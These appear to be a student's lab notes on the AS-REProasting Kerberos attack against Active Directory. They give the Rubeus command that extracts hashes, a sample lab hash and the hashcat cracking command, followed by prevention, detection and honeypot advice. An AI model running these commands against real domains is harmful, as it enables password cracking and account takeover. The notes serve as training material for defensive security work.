# AS-REProasting

## Description

The `AS-REProasting` attack is similar to the `Kerberoasting` attack; we can obtain crackable hashes for user accounts that have the property `Do not require Kerberos preauthentication` enabled. The success of this attack depends on the strength of the user account password that we will crack.

***

## Attack

To get the crackable hashes we will use Rufeus again.\
However, this time, we will use the `asreproast` action. If we don't specify a name, `Rubeus` will extract hashes for each user that has `Kerberos preauthentication` not required

### extract hashes for each user that has "Kerberos preauthentication" not required

```powershell-session
.\Rubeus.exe asreproast /outfile:asrep.txt
```

Once we get the Rubeus file it will be placed in Downloads by default. Move the files to our kali machine via smb (shown n the second lesson)

***

### Hashcad edit for cracking the hash

Now for hashcat to reckgodnize this hash, we need to add $23 after $krb5asrep\`

```shell-session
$krb5asrep$23$anni@eagle.local:1b912b858c4551c0013dbe81ff0f01d7$c64803358a43d05383e9e01374e8f2b2c92f9d6c669cdc4a1b9c1ed684c7857c965b8e44a285bc0e2f1bc248159aa7448494de4c1f997382518278e375a7a4960153e13dae1cd28d05b7f2377a038062f8e751c1621828b100417f50ce617278747d9af35581e38c381bb0a3ff246912def5dd2d53f875f0a64c46349fdf3d7ed0d8ff5a08f2b78d83a97865a3ea2f873be57f13b4016331eef74e827a17846cb49ccf982e31460ab25c017fd44d46cd8f545db00b6578150a4c59150fbec18f0a2472b18c5123c34e661cc8b52dfee9c93dd86e0afa66524994b04c5456c1e71ccbd2183ba0c43d2550
```

We can now use `hashcat` with the hash-mode (option -m) `18200` for `AS-REPRoastable` hashes. We also pass a dictionary file with passwords (the file `passwords.txt`) and save the output of any successfully cracked tickets to the file `asrepcracked.txt`

## Crack hash

```shell-session
sudo hashcat -m 18200 -a 0 asrep.txt passwords.txt --outfile asrepcrack.txt --force
```

Open the output file and see the password at the end of the doc

***

## Prevention

* Only enable **"Do not require Kerberos preauthentication"** if absolutely necessary.
* **Review user accounts quarterly** to remove this setting if not needed.
* Regular users with this setting often have **weak passwords** – easy to crack.
* For required cases, enforce a **20+ character password policy**.

***

## Detection

* When we executed Rubeus, an Event with ID `4768` was generated, signaling that a `Kerberos Authentication ticket` was generated
* This ID is created for every ticket kerberos creates so it will be a lot of this ID
* You can **track source IPs** to detect unusual authentication behavior.
* **Alert on logins from unexpected VLANs** to catch potential attacks.

***

## Honeypot

* **Honeypot users** are fake accounts with no real use—any login attempt is suspicious.
* If it’s the **only** account without **Kerberos Pre-Authentication**, attackers may recognize and avoid it.
* **Old & Inactive** – Use an aged, unused account to avoid suspicion.
* **Password Age** – Service accounts: **2+ years** old, Regular accounts: **less than 1 year**.
* **Login History** – Ensure some login history **after** the last password change.
* **Minimal Privileges** – Assign some privileges to make the account interesting for attackers.

***

## Task

The tasks are done the same principe as the kerberoasting lesson.
